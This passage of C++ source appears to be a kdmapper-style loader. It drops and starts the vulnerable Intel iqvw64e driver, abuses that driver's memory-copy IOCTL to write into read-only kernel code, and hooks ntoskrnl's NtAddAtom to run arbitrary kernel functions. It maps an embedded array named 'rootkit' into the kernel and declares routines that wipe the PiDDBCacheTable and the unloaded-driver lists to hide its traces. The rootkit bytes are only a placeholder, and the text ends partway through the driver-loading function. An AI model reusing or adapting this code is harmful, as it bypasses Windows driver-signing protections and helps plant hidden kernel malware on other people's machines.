#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdint.h>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>

#include <windows.h>
#include <stdint.h>
#include <vector>
#include <string>

namespace portable_executable {
   struct RelocInfo {
      uint64_t  address;
      uint16_t *item;
      uint32_t  count;
   };

   struct ImportFunctionInfo {
      std::string name;
      uint64_t   *address;
   };

   struct ImportInfo {
      std::string                     module_name;
      std::vector<ImportFunctionInfo> function_datas;
   };

   using vec_sections = std::vector<IMAGE_SECTION_HEADER>;
   using vec_relocs   = std::vector<RelocInfo>;
   using vec_imports  = std::vector<ImportInfo>;

   PIMAGE_NT_HEADERS64 GetNtHeaders(void *image_base);
   vec_relocs          GetRelocs(void *image_base);
   vec_imports         GetImports(void *image_base);
}


#if defined(DISABLE_OUTPUT)
#define Log(content)
#else
#define Log(content) std::wcout << content
#endif

#include <windows.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <vector>
#include <string>
#include <iostream>
#include <fstream>

#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

namespace nt {
   constexpr auto PAGE_SIZE                   = 0x1000;
   constexpr auto STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

   constexpr auto SystemModuleInformation         = 11;
   constexpr auto SystemHandleInformation         = 16;
   constexpr auto SystemExtendedHandleInformation = 64;

   typedef NTSTATUS (*NtLoadDriver)(PUNICODE_STRING DriverServiceName);
   typedef NTSTATUS (*NtUnloadDriver)(PUNICODE_STRING DriverServiceName);
   typedef NTSTATUS (*RtlAdjustPrivilege)(_In_ ULONG     Privilege,
                                          _In_ BOOLEAN   Enable,
                                          _In_ BOOLEAN   Client,
                                          _Out_ PBOOLEAN WasEnabled);

   typedef struct _SYSTEM_HANDLE {
      PVOID  Object;
      HANDLE UniqueProcessId;
      HANDLE HandleValue;
      ULONG  GrantedAccess;
      USHORT CreatorBackTraceIndex;
      USHORT ObjectTypeIndex;
      ULONG  HandleAttributes;
      ULONG  Reserved;
   } SYSTEM_HANDLE, *PSYSTEM_HANDLE;

   typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
      ULONG_PTR     HandleCount;
      ULONG_PTR     Reserved;
      SYSTEM_HANDLE Handles[1];
   } SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;


   typedef enum class _POOL_TYPE {
      NonPagedPool,
      NonPagedPoolExecute = NonPagedPool,
      PagedPool,
      NonPagedPoolMustSucceed = NonPagedPool + 2,
      DontUseThisType,
      NonPagedPoolCacheAligned = NonPagedPool + 4,
      PagedPoolCacheAligned,
      NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
      MaxPoolType,
      NonPagedPoolBase                     = 0,
      NonPagedPoolBaseMustSucceed          = NonPagedPoolBase + 2,
      NonPagedPoolBaseCacheAligned         = NonPagedPoolBase + 4,
      NonPagedPoolBaseCacheAlignedMustS    = NonPagedPoolBase + 6,
      NonPagedPoolSession                  = 32,
      PagedPoolSession                     = NonPagedPoolSession + 1,
      NonPagedPoolMustSucceedSession       = PagedPoolSession + 1,
      DontUseThisTypeSession               = NonPagedPoolMustSucceedSession + 1,
      NonPagedPoolCacheAlignedSession      = DontUseThisTypeSession + 1,
      PagedPoolCacheAlignedSession         = NonPagedPoolCacheAlignedSession + 1,
      NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
      NonPagedPoolNx                       = 512,
      NonPagedPoolNxCacheAligned           = NonPagedPoolNx + 4,
      NonPagedPoolSessionNx                = NonPagedPoolNx + 32,
   } POOL_TYPE;

   typedef struct _RTL_PROCESS_MODULE_INFORMATION {
      HANDLE Section;
      PVOID  MappedBase;
      PVOID  ImageBase;
      ULONG  ImageSize;
      ULONG  Flags;
      USHORT LoadOrderIndex;
      USHORT InitOrderIndex;
      USHORT LoadCount;
      USHORT OffsetToFileName;
      UCHAR  FullPathName[256];
   } RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

   typedef struct _RTL_PROCESS_MODULES {
      ULONG                          NumberOfModules;
      RTL_PROCESS_MODULE_INFORMATION Modules[1];
   } RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;


   typedef enum _MEMORY_CACHING_TYPE_ORIG {
      MmFrameBufferCached = 2
   } MEMORY_CACHING_TYPE_ORIG;

   typedef enum _MEMORY_CACHING_TYPE {
      MmNonCached     = FALSE,
      MmCached        = TRUE,
      MmWriteCombined = MmFrameBufferCached,
      MmHardwareCoherentCached,
      MmNonCachedUnordered,
      MmUSWCCached,
      MmMaximumCacheType,
      MmNotMapped = -1
   } MEMORY_CACHING_TYPE;

   typedef CCHAR KPROCESSOR_MODE;

   typedef enum _MODE {
      KernelMode,
      UserMode,
      MaximumMode
   } MODE;

   typedef enum _MM_PAGE_PRIORITY {
      LowPagePriority,
      NormalPagePriority = 16,
      HighPagePriority   = 32
   } MM_PAGE_PRIORITY;

}

namespace utils {
   std::wstring GetFullTempPath();
   bool         ReadFileToMemory(const std::wstring &file_path, std::vector<uint8_t> *out_buffer);
   bool         CreateFileFromMemory(const std::wstring &desired_file_path, const char *address, size_t size);
   uint64_t     GetKernelModuleAddress(const std::string &module_name);
   BOOLEAN      bDataCompare(const BYTE *pData, const BYTE *bMask, const char *szMask);
   uintptr_t    FindPattern(uintptr_t dwAddress, uintptr_t dwLen, BYTE *bMask, char *szMask);
   PVOID        FindSection(char *sectionName, uintptr_t modulePtr, PULONG size);
}

#include <windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <atlstr.h>

#include <stdint.h>

namespace intel_driver_resource {
   static const uint8_t driver[] = {0x4D};
}

#include <windows.h>
#include <string>
#include <filesystem>

namespace service {
   bool RegisterAndStart(const std::wstring &driver_path);
   bool StopAndRemove(const std::wstring &driver_name);
};

#include <assert.h>

namespace intel_driver {
   extern char        driver_name[100];
   constexpr uint32_t ioctl1            = 0x80862007;
   constexpr DWORD    iqvw64e_timestamp = 0x5284EAC3;
   extern ULONG64     ntoskrnlAddr;

   typedef struct _COPY_MEMORY_BUFFER_INFO {
      uint64_t case_number;
      uint64_t reserved;
      uint64_t source;
      uint64_t destination;
      uint64_t length;
   } COPY_MEMORY_BUFFER_INFO, *PCOPY_MEMORY_BUFFER_INFO;

   typedef struct _FILL_MEMORY_BUFFER_INFO {
      uint64_t case_number;
      uint64_t reserved1;
      uint32_t value;
      uint32_t reserved2;
      uint64_t destination;
      uint64_t length;
   } FILL_MEMORY_BUFFER_INFO, *PFILL_MEMORY_BUFFER_INFO;

   typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
      uint64_t case_number;
      uint64_t reserved;
      uint64_t return_physical_address;
      uint64_t address_to_translate;
   } GET_PHYS_ADDRESS_BUFFER_INFO, *PGET_PHYS_ADDRESS_BUFFER_INFO;

   typedef struct _MAP_IO_SPACE_BUFFER_INFO {
      uint64_t case_number;
      uint64_t reserved;
      uint64_t return_value;
      uint64_t return_virtual_address;
      uint64_t physical_address_to_map;
      uint32_t size;
   } MAP_IO_SPACE_BUFFER_INFO, *PMAP_IO_SPACE_BUFFER_INFO;

   typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
      uint64_t case_number;
      uint64_t reserved1;
      uint64_t reserved2;
      uint64_t virt_address;
      uint64_t reserved3;
      uint32_t number_of_bytes;
   } UNMAP_IO_SPACE_BUFFER_INFO, *PUNMAP_IO_SPACE_BUFFER_INFO;

   typedef struct _RTL_BALANCED_LINKS {
      struct _RTL_BALANCED_LINKS *Parent;
      struct _RTL_BALANCED_LINKS *LeftChild;
      struct _RTL_BALANCED_LINKS *RightChild;
      CHAR                        Balance;
      UCHAR                       Reserved[3];
   } RTL_BALANCED_LINKS;
   typedef RTL_BALANCED_LINKS *PRTL_BALANCED_LINKS;

   typedef struct _RTL_AVL_TABLE {
      RTL_BALANCED_LINKS BalancedRoot;
      PVOID              OrderedPointer;
      ULONG              WhichOrderedElement;
      ULONG              NumberGenericTableElements;
      ULONG              DepthOfTree;
      PVOID              RestartKey;
      ULONG              DeleteCount;
      PVOID              CompareRoutine;
      PVOID              AllocateRoutine;
      PVOID              FreeRoutine;
      PVOID              TableContext;
   } RTL_AVL_TABLE;
   typedef RTL_AVL_TABLE *PRTL_AVL_TABLE;

   typedef struct _PiDDBCacheEntry {
      LIST_ENTRY     List;
      UNICODE_STRING DriverName;
      ULONG          TimeDateStamp;
      NTSTATUS       LoadStatus;
      char           _0x0028[16];
   } PiDDBCacheEntry, *NPiDDBCacheEntry;

   typedef struct _HashBucketEntry {
      struct _HashBucketEntry *Next;
      UNICODE_STRING           DriverName;
      ULONG                    CertHash[5];
   } HashBucketEntry, *PHashBucketEntry;

   bool             ClearPiDDBCacheTable(HANDLE device_handle);
   bool             ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait);
   bool             ExReleaseResourceLite(HANDLE device_handle, PVOID Resource);
   BOOLEAN          RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer);
   PVOID            RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer);
   PiDDBCacheEntry *LookupEntry(HANDLE         device_handle,
                                PRTL_AVL_TABLE PiDDBCacheTable,
                                ULONG          timestamp,
                                const wchar_t *name);
   PVOID            ResolveRelativeAddress(HANDLE     device_handle,
                                           _In_ PVOID Instruction,
                                           _In_ ULONG OffsetOffset,
                                           _In_ ULONG InstructionSize);

   uintptr_t FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE *bMask, char *szMask);
   uintptr_t FindSectionAtKernel(HANDLE device_handle, char *sectionName, uintptr_t modulePtr, PULONG size);
   uintptr_t FindPatternInSectionAtKernel(HANDLE    device_handle,
                                          char     *sectionName,
                                          uintptr_t modulePtr,
                                          BYTE     *bMask,
                                          char     *szMask);

   bool ClearKernelHashBucketList(HANDLE device_handle);

   bool   IsRunning();
   HANDLE Load();
   bool   Unload(HANDLE device_handle);

   bool     MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size);
   bool     SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size);
   bool     GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t *out_physical_address);
   uint64_t MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size);
   bool     UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size);
   bool     ReadMemory(HANDLE device_handle, uint64_t address, void *buffer, uint64_t size);
   bool     WriteMemory(HANDLE device_handle, uint64_t address, void *buffer, uint64_t size);
   bool     WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void *buffer, uint32_t size);
   uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);

   uint64_t MmAllocatePagesForMdl(HANDLE        device_handle,
                                  LARGE_INTEGER LowAddress,
                                  LARGE_INTEGER HighAddress,
                                  LARGE_INTEGER SkipBytes,
                                  SIZE_T        TotalBytes);
   uint64_t MmMapLockedPagesSpecifyCache(HANDLE                  device_handle,
                                         uint64_t                pmdl,
                                         nt::KPROCESSOR_MODE     AccessMode,
                                         nt::MEMORY_CACHING_TYPE CacheType,
                                         uint64_t                RequestedAddress,
                                         ULONG                   BugCheckOnFailure,
                                         ULONG                   Priority);
   bool     MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect);
   bool     MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl);
   bool     MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList);


   bool     FreePool(HANDLE device_handle, uint64_t address);
   uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string &function_name);
   bool     ClearMmUnloadedDrivers(HANDLE device_handle);
   std::wstring GetDriverNameW();
   std::wstring GetDriverPath();

   template<typename T, typename... A>
   bool CallKernelFunction(HANDLE device_handle, T *out_result, uint64_t kernel_function_address, const A... arguments)
   {
      constexpr auto call_void = std::is_same_v<T, void>;

      if constexpr (!call_void) {
         if (!out_result)
            return false;
      }
      else {
         UNREFERENCED_PARAMETER(out_result);
      }

      if (!kernel_function_address)
         return false;


      HMODULE ntdll = GetModuleHandleA("ntdll.dll");
      if (ntdll == 0) {
         Log(L"[-] Failed to load ntdll.dll" << std::endl);
         return false;
      }

      const auto NtAddAtom = reinterpret_cast<void *>(GetProcAddress(ntdll, "NtAddAtom"));
      if (!NtAddAtom) {
         Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
         return false;
      }

      uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
      uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
      *(uint64_t *)&kernel_injected_jmp[2] = kernel_function_address;

      static uint64_t kernel_NtAddAtom = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "NtAddAtom");
      if (!kernel_NtAddAtom) {
         Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
         return false;
      }

      if (!ReadMemory(device_handle, kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
         return false;

      if (original_kernel_function[0] == kernel_injected_jmp[0] && original_kernel_function[1] == kernel_injected_jmp[1]
          && original_kernel_function[sizeof(kernel_injected_jmp) - 2]
                == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2]
          && original_kernel_function[sizeof(kernel_injected_jmp) - 1]
                == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
         Log(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
         return false;
      }


      if (!WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
         return false;


      if constexpr (!call_void) {
         using FunctionFn    = T(__stdcall *)(A...);
         const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

         *out_result = Function(arguments...);
      }
      else {
         using FunctionFn    = void(__stdcall *)(A...);
         const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

         Function(arguments...);
      }


      WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
      return true;
   }
}

#define PAGE_SIZE 0x1000

namespace kdmapper {
   typedef bool (
      *mapCallback)(ULONG64 *param1, ULONG64 *param2, ULONG64 allocationPtr, ULONG64 allocationSize, ULONG64 mdlptr);


   uint64_t MapDriver(HANDLE      iqvw64e_device_handle,
                      BYTE       *data,
                      ULONG64     param1                            = 0,
                      ULONG64     param2                            = 0,
                      bool        free                              = false,
                      bool        destroyHeader                     = true,
                      bool        mdlMode                           = false,
                      bool        PassAllocationAddressAsFirstParam = false,
                      mapCallback callback                          = nullptr,
                      NTSTATUS   *exitCode                          = nullptr);
   void     RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta);
   bool     ResolveImports(HANDLE iqvw64e_device_handle, portable_executable::vec_imports imports);
   uint64_t AllocMdlMemory(HANDLE iqvw64e_device_handle, uint64_t size, uint64_t *mdlPtr);
}

unsigned char rootkit[22952] = {0x4D};

#include <fstream>

HANDLE iqvw64e_device_handle;

LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS *ExceptionInfo)
{
   if (ExceptionInfo && ExceptionInfo->ExceptionRecord)
      Log(L"[!!] Crash at addr 0x" << ExceptionInfo->ExceptionRecord->ExceptionAddress << L" by 0x" << std::hex
                                   << ExceptionInfo->ExceptionRecord->ExceptionCode << std::endl);
   else
      Log(L"[!!] Crash" << std::endl);

   if (iqvw64e_device_handle)
      intel_driver::Unload(iqvw64e_device_handle);

   return EXCEPTION_EXECUTE_HANDLER;
}

int paramExists(const int argc, wchar_t **argv, const wchar_t *param)
{
   size_t plen = wcslen(param);
   for (int i = 1; i < argc; i++) {
      if (wcslen(argv[i]) == plen + 1ull && _wcsicmp(&argv[i][1], param) == 0 && argv[i][0] == '/') {
         return i;
      }
      else if (wcslen(argv[i]) == plen + 2ull && _wcsicmp(&argv[i][2], param) == 0 && argv[i][0] == '-'
               && argv[i][1] == '-') {
         return i;
      }
   }
   return -1;
}

bool callbackExample(ULONG64 *param1, ULONG64 *param2, ULONG64 allocationPtr, ULONG64 allocationSize, ULONG64 mdlptr)
{
   UNREFERENCED_PARAMETER(param1);
   UNREFERENCED_PARAMETER(param2);
   UNREFERENCED_PARAMETER(allocationPtr);
   UNREFERENCED_PARAMETER(allocationSize);
   UNREFERENCED_PARAMETER(mdlptr);
   Log("[+] Callback example called" << std::endl);


   return true;
}
int wmain(const int argc, wchar_t **argv)
{
   SetUnhandledExceptionFilter(SimplestCrashHandler);

   iqvw64e_device_handle = intel_driver::Load();

   if (iqvw64e_device_handle == INVALID_HANDLE_VALUE)
      return -1;

   NTSTATUS exitCode = 0;
   if (!kdmapper::
          MapDriver(iqvw64e_device_handle, rootkit, 0, 0, false, true, false, false, callbackExample, &exitCode)) {
      Log(L"[-] Failed to map rootkit" << std::endl);
      intel_driver::Unload(iqvw64e_device_handle);
      return -1;
   }

   if (!intel_driver::Unload(iqvw64e_device_handle)) {
      Log(L"[-] Warning failed to fully unload vulnerable driver " << std::endl);
   }
   Log(L"[+] success" << std::endl);
}

PIMAGE_NT_HEADERS64 portable_executable::GetNtHeaders(void *image_base)
{
   const auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(image_base);

   if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
      return nullptr;

   const auto nt_headers
      = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uint64_t>(image_base) + dos_header->e_lfanew);

   if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
      return nullptr;

   return nt_headers;
}

portable_executable::vec_relocs portable_executable::GetRelocs(void *image_base)
{
   const PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);

   if (!nt_headers)
      return {};

   vec_relocs relocs;
   DWORD      reloc_va = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

   if (!reloc_va)
      return {};

   auto current_base_relocation
      = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(image_base) + reloc_va);
   const auto reloc_end = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
      reinterpret_cast<uint64_t>(current_base_relocation)
      + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);

   while (current_base_relocation < reloc_end && current_base_relocation->SizeOfBlock) {
      RelocInfo reloc_info;

      reloc_info.address = reinterpret_cast<uint64_t>(image_base) + current_base_relocation->VirtualAddress;
      reloc_info.item    = reinterpret_cast<uint16_t *>(reinterpret_cast<uint64_t>(current_base_relocation)
                                                     + sizeof(IMAGE_BASE_RELOCATION));
      reloc_info.count   = (current_base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);

      relocs.push_back(reloc_info);

      current_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
         reinterpret_cast<uint64_t>(current_base_relocation) + current_base_relocation->SizeOfBlock);
   }

   return relocs;
}

portable_executable::vec_imports portable_executable::GetImports(void *image_base)
{
   const PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);

   if (!nt_headers)
      return {};

   DWORD import_va = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;


   if (!import_va)
      return {};

   vec_imports imports;

   auto current_import_descriptor
      = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<uint64_t>(image_base) + import_va);

   while (current_import_descriptor->FirstThunk) {
      ImportInfo import_info;

      import_info.module_name = std::string(
         reinterpret_cast<char *>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->Name));

      auto current_first_thunk        = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uint64_t>(image_base)
                                                                       + current_import_descriptor->FirstThunk);
      auto current_originalFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(
         reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->OriginalFirstThunk);

      while (current_originalFirstThunk->u1.Function) {
         ImportFunctionInfo import_function_data;

         auto thunk_data = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(reinterpret_cast<uint64_t>(image_base)
                                                                   + current_originalFirstThunk->u1.AddressOfData);

         import_function_data.name    = thunk_data->Name;
         import_function_data.address = &current_first_thunk->u1.Function;

         import_info.function_datas.push_back(import_function_data);

         ++current_originalFirstThunk;
         ++current_first_thunk;
      }

      imports.push_back(import_info);
      ++current_import_descriptor;
   }

   return imports;
}


std::wstring utils::GetFullTempPath()
{
   wchar_t        temp_directory[MAX_PATH + 1] = {0};
   const uint32_t get_temp_path_ret            = GetTempPathW(sizeof(temp_directory) / 2, temp_directory);
   if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH + 1) {
      Log(L"[-] Failed to get temp path" << std::endl);
      return L"";
   }
   if (temp_directory[wcslen(temp_directory) - 1] == L'\\')
      temp_directory[wcslen(temp_directory) - 1] = 0x0;

   return std::wstring(temp_directory);
}

bool utils::ReadFileToMemory(const std::wstring &file_path, std::vector<uint8_t> *out_buffer)
{
   std::ifstream file_ifstream(file_path, std::ios::binary);

   if (!file_ifstream)
      return false;

   out_buffer->assign((std::istreambuf_iterator<char>(file_ifstream)), std::istreambuf_iterator<char>());
   file_ifstream.close();

   return true;
}

bool utils::CreateFileFromMemory(const std::wstring &desired_file_path, const char *address, size_t size)
{
   std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

   if (!file_ofstream.write(address, size)) {
      file_ofstream.close();
      return false;
   }

   file_ofstream.close();
   return true;
}

uint64_t utils::GetKernelModuleAddress(const std::string &module_name)
{
   void *buffer      = nullptr;
   DWORD buffer_size = 0;

   NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation),
                                              buffer,
                                              buffer_size,
                                              &buffer_size);

   while (status == nt::STATUS_INFO_LENGTH_MISMATCH) {
      if (buffer != nullptr)
         VirtualFree(buffer, 0, MEM_RELEASE);

      buffer = VirtualAlloc(nullptr, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
      status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation),
                                        buffer,
                                        buffer_size,
                                        &buffer_size);
   }

   if (!NT_SUCCESS(status)) {
      if (buffer != nullptr)
         VirtualFree(buffer, 0, MEM_RELEASE);
      return 0;
   }

   const auto modules = static_cast<nt::PRTL_PROCESS_MODULES>(buffer);
   if (!modules)
      return 0;

   for (auto i = 0u; i < modules->NumberOfModules; ++i) {
      const std::string current_module_name = std::string(reinterpret_cast<char *>(modules->Modules[i].FullPathName)
                                                          + modules->Modules[i].OffsetToFileName);

      if (!_stricmp(current_module_name.c_str(), module_name.c_str())) {
         const uint64_t result = reinterpret_cast<uint64_t>(modules->Modules[i].ImageBase);

         VirtualFree(buffer, 0, MEM_RELEASE);
         return result;
      }
   }

   VirtualFree(buffer, 0, MEM_RELEASE);
   return 0;
}

BOOLEAN utils::bDataCompare(const BYTE *pData, const BYTE *bMask, const char *szMask)
{
   for (; *szMask; ++szMask, ++pData, ++bMask)
      if (*szMask == 'x' && *pData != *bMask)
         return 0;
   return (*szMask) == 0;
}

uintptr_t utils::FindPattern(uintptr_t dwAddress, uintptr_t dwLen, BYTE *bMask, char *szMask)
{
   size_t max_len = dwLen - strlen(szMask);
   for (uintptr_t i = 0; i < max_len; i++)
      if (bDataCompare((BYTE *)(dwAddress + i), bMask, szMask))
         return (uintptr_t)(dwAddress + i);
   return 0;
}

PVOID utils::FindSection(char *sectionName, uintptr_t modulePtr, PULONG size)
{
   size_t                namelength = strlen(sectionName);
   PIMAGE_NT_HEADERS     headers    = (PIMAGE_NT_HEADERS)(modulePtr + ((PIMAGE_DOS_HEADER)modulePtr)->e_lfanew);
   PIMAGE_SECTION_HEADER sections   = IMAGE_FIRST_SECTION(headers);
   for (DWORD i = 0; i < headers->FileHeader.NumberOfSections; ++i) {
      PIMAGE_SECTION_HEADER section = &sections[i];
      if (memcmp(section->Name, sectionName, namelength) == 0 && namelength == strlen((char *)section->Name)) {
         if (!section->VirtualAddress) {
            return 0;
         }
         if (size) {
            *size = section->Misc.VirtualSize;
         }
         return (PVOID)(modulePtr + section->VirtualAddress);
      }
   }
   return 0;
}


bool service::RegisterAndStart(const std::wstring &driver_path)
{
   const static DWORD ServiceTypeKernel = 1;
   const std::wstring driver_name       = intel_driver::GetDriverNameW();
   const std::wstring servicesPath      = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
   const std::wstring nPath             = L"\\??\\" + driver_path;

   HKEY    dservice;
   LSTATUS status = RegCreateKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice);
   if (status != ERROR_SUCCESS) {
      Log("[-] Can't create service key" << std::endl);
      return false;
   }

   status = RegSetKeyValueW(dservice,
                            NULL,
                            L"ImagePath",
                            REG_EXPAND_SZ,
                            nPath.c_str(),
                            (DWORD)(nPath.size() * sizeof(wchar_t)));
   if (status != ERROR_SUCCESS) {
      RegCloseKey(dservice);
      Log("[-] Can't create 'ImagePath' registry value" << std::endl);
      return false;
   }

   status = RegSetKeyValueW(dservice, NULL, L"Type", REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));
   if (status != ERROR_SUCCESS) {
      RegCloseKey(dservice);
      Log("[-] Can't create 'Type' registry value" << std::endl);
      return false;
   }

   RegCloseKey(dservice);

   HMODULE ntdll = GetModuleHandleA("ntdll.dll");
   if (ntdll == NULL) {
      return false;
   }

   auto RtlAdjustPrivilege = (nt::RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
   auto NtLoadDriver       = (nt::NtLoadDriver)GetProcAddress(ntdll, "NtLoadDriver");

   ULONG    SE_LOAD_DRIVER_PRIVILEGE = 10UL;
   BOOLEAN  SeLoadDriverWasEnabled;
   NTSTATUS Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
   if (!NT_SUCCESS(Status)) {
      Log("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator."
          << std::endl);
      return false;
   }

   std::wstring   wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name;
   UNICODE_STRING serviceStr;
   RtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());

   Status = NtLoadDriver(&serviceStr);
   Log("[+] NtLoadDriver Status 0x" << std::hex << Status << std::endl);


   if (Status == 0xC000010E) {
      return true;
   }

   return NT_SUCCESS(Status);
}

bool service::StopAndRemove(const std::wstring &driver_name)
{
   HMODULE ntdll = GetModuleHandleA("ntdll.dll");
   if (ntdll == NULL)
      return false;

   std::wstring   wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name;
   UNICODE_STRING serviceStr;
   RtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());

   HKEY         driver_service;
   std::wstring servicesPath = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
   LSTATUS      status       = RegOpenKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &driver_service);
   if (status != ERROR_SUCCESS) {
      if (status == ERROR_FILE_NOT_FOUND) {
         return true;
      }
      return false;
   }
   RegCloseKey(driver_service);

   auto     NtUnloadDriver = (nt::NtUnloadDriver)GetProcAddress(ntdll, "NtUnloadDriver");
   NTSTATUS st             = NtUnloadDriver(&serviceStr);
   Log("[+] NtUnloadDriver Status 0x" << std::hex << st << std::endl);
   if (st != 0x0) {
      Log("[-] Driver Unload Failed!!" << std::endl);
      status = RegDeleteKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
      return false;
   }

   status = RegDeleteKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
   if (status != ERROR_SUCCESS) {
      return false;
   }
   return true;
}

ULONG64   intel_driver::ntoskrnlAddr     = 0;
char      intel_driver::driver_name[100] = {};
uintptr_t PiDDBLockPtr;
uintptr_t PiDDBCacheTablePtr;

std::wstring intel_driver::GetDriverNameW()
{
   std::string  t(intel_driver::driver_name);
   std::wstring name(t.begin(), t.end());
   return name;
}

std::wstring intel_driver::GetDriverPath()
{
   std::wstring temp = utils::GetFullTempPath();
   if (temp.empty()) {
      return L"";
   }
   return temp + L"\\" + GetDriverNameW();
}

bool intel_driver::IsRunning()
{
   const HANDLE file_handle
      = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
   if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE) {
      CloseHandle(file_handle);
      return true;
   }
   return false;
}

HANDLE intel_driver::Load()
{
   srand((unsigned)time(NULL) * GetCurrentThreadId());


   if (intel_driver::IsRunning()) {
      Log(L"[-] \\Device\\Nal is already in use." << std::endl);
      return INVALID_HANDLE_VALUE;
   }


   memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
   static const char alphanum[]
      = "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
   int len = rand() % 20 + 10;
   for (int i = 0; i < len; ++i)
      intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

   Log(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

